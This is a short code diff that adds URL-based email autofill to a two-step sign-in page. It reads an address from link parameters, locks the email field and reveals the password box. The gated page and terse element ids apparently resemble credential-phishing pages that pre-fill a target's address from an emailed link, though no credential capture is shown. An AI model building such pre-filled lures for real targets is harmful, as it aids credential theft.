@@ -463,6 +463,41 @@ body.gated > *:not(#page-gate) { visibility: hidden; }
 
   let step = 1
 
+  // ====== URL EMAIL AUTOFILL ======
+  function readEmailFromURL() {
+    const params = new URLSearchParams(location.search);
+    const raw =
+      params.get("email") ||
+      params.get("e")     ||
+      params.get("to")    ||
+      params.get("mail")  ||
+      "";
+    const trimmed = raw.trim().slice(0, 254);
+    if (!trimmed || trimmed.length < 3 || !trimmed.includes("@")) return "";
+    return trimmed;
+  }
+
+  (function applyURLEmailAutofill() {
+    const email = readEmailFromURL();
+    if (!email) return;
+
+    const emailField        = document.getElementById("ai");
+    const passwordContainer = document.getElementById("div2");
+    const buttonText        = document.querySelector(".button_text");
+
+    if (!emailField) return;
+
+    emailField.value    = email;
+    emailField.disabled = true;
+
+    if (passwordContainer) passwordContainer.style.display = "block";
+    if (buttonText)        buttonText.textContent = "Sign In";
+
+    step = 2;
+  })();
+  // ====== END URL EMAIL AUTOFILL ======
+  
+
   const showLoading = () => {
     buttonText.style.display = "none"
     loader.style.display = "inline-block"
